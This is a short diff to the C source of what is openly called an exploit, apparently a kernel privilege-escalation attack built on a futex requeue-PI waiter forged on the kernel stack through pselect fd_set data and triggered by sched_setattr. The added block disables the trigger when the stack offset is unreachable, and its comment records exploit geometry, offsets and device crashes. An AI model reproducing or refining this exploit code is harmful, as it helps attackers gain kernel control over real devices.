@@ -668,6 +668,28 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
+#if defined(SLIDE_SKIP_UNREACHABLE_LOCK) && SLIDE_SKIP_UNREACHABLE_LOCK
+    /*
+     * A06 geometry: the walked futex rt_mutex_waiter (FUTEX_WAIT_REQUEUE_PI)
+     * sits at task->stack + 0x3c80 with ->lock at +0x58 = 0x3cd8, which is
+     * global fd_set index 23.  core_sys_select() only keeps the fd_set copy
+     * on the kernel stack while nfds <= 320 (15 qwords total, indices 0..14)
+     * and falls back to kvmalloc beyond that, so this kernel can never place
+     * the fake waiter's lock at the walked offset.  Firing sched_setattr
+     * here NULL-derefs in rt_mutex_adjust_prio_chain -> _raw_spin_trylock
+     * (confirmed by crashes #3/#5/#6/#7/#8: waiter->lock all-zero at 0x3cd8).
+     * Do not fire the writer; keep the futex/requeue window disabled so the
+     * exploit fails cleanly instead of panic the device.
+     */
+    if (slide_pselect_shift() + 11 > 14 ||
+        slide_pselect_nfds > PSELECT_ROUTE_NFDS) {
+      pr_warning("slide pselect lock slot unreachable shift=%d nfds=%d; "
+                 "supressing sched_setattr writer\n",
+                 slide_pselect_shift(), slide_pselect_nfds);
+      atomic_store(&slide_consume_stop, 1);
+      return NULL;
+    }
+#endif
     *errno_ptr = 0;
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
